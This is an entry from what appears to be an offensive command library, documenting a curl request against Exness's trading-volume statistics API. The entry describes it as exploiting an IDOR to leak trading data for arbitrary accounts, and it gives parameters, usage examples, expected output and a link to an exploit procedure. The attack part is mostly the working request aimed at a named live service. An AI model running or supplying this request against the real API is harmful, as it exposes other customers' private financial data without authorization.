---
id: cmd-volume-stats-001
data: >-
  curl -X GET
  "https://api.exness.com/v3/personal_area/stats/trading_volume?time_range=365&accounts={accountNumber}"
  -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
tags:
  - idor
  - api
  - exness
type: command
output: JSON containing trading volume figures
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.143Z'
verified: false
validated: true
submitted: true
---
# query-exness-volume-stats

## Command

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/trading_volume?time_range=365&accounts={accountNumber}" -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
```

## Description

Fetches trading volume statistics for a specified MT account, demonstrating IDOR by leaking data for arbitrary accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| accounts | Account to query | Yes |
| time_range | Days (365) | Yes |
| Authorization | Bearer token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/trading_volume?time_range=365&accounts=xxx" -H "Authorization: Bearer eyJ..."
```

### Advanced Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/trading_volume?time_range=365&accounts=xxx" -H "Authorization: Bearer {token}" --verbose
```

## Expected Output

JSON volume data, e.g., {"data": [{"date": "2023-01-01", "volume": 1000.00}]}. Unauthorized if volumes don't match own trading.

## Related

- [[commands/query-exness-net-profit-stats]]
- [[procedures/Exploit-IDOR-in-Exness-Stats-API]]
